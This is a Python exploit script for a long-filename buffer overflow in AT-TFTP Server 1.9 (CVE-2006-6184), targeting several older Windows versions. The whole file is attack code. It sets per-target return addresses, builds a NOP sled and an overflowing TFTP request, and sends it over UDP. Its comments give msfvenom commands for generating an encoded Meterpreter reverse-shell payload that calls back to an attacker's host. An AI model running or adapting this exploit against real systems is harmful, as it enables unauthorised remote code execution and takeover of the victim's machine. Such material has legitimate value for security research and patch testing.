#!/usr/bin/python
# Exploit Title: AT-TFTP Server 1.9 - Long Filename Overflow
# Exploit Author: T0w3ntum
# Vendor Homepage: http://www.alliedtelesis.com/
# Version: 1.9
# Tested on: Windows Server 2003
# CVE : CVE-2006-6184

import socket, sys
from struct import *

usage = "%s [RHOST] [RPORT] [LHOST] [TARGET]" % (sys.argv[0])
targets = '''
1. Windows NT SP4 English
2. Windows 2000 SP0 English
3. Windows 2000 SP1 English
4. Windows 2000 SP2 English
5. Windows 2000 SP3 English
6. Windows 2000 SP4 English
7. Windows XP SP0/1 English
8. Windows XP SP2 English
9. Windows Server 2003
'''

if len(sys.argv) < 4:
  print usage + '\n' + targets
  sys.exit()

rhost = sys.argv[1]
lhost = sys.argv[3]
rport = int(sys.argv[2])
target = int(sys.argv[4])

if target == 1:
  ret = pack('<L',0x702ea6f7)
elif target == 2:
  ret = pack('<L',0x750362c3)
elif target == 3:
  ret = pack('<L',0x75031d85)
elif target == 4:
  ret = pack('<L',0x7503431b)
elif target == 5:
  ret = pack('<L',0x74fe1c5a)
elif target == 6:
  ret = pack('<L',0x75031dce)
elif target == 7:
  ret = pack('<L',0x71ab7bfb)
elif target == 8:
  ret = pack('<L',0x71ab9372)
elif target == 9:
  ret = pack('<L',0x7c86fed3)
else:
	print "[+] Invalid Target"
	sys.exit()

nop = "\x90" * (25-len(lhost))

# Payload here
# We only have 210 bytes for our shellcode so we are using NONX with --smallest to get a relatively small payload.
# msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=YOUR IP LPORT=YOUR PORT --smallest R > payload
# perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj  <---  sub esp, 0xDAC | Subtract 3500 from ESP
# cat stackadj payload > shellcode
# cat shellcode | msfvenom -b '\x00' -e x86/shikata_ga_nai -f python --platform windows --arch x86
buf = ""

payload = "\x00\x02" + nop + buf + ret + "\x83\xc4\x28\xc3\x00netascii\x00"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print "[+] Sending payload to %s" % (rhost)
sock.sendto(payload, (rhost, rport))
print "[+] Buffer sent. Check for shell."
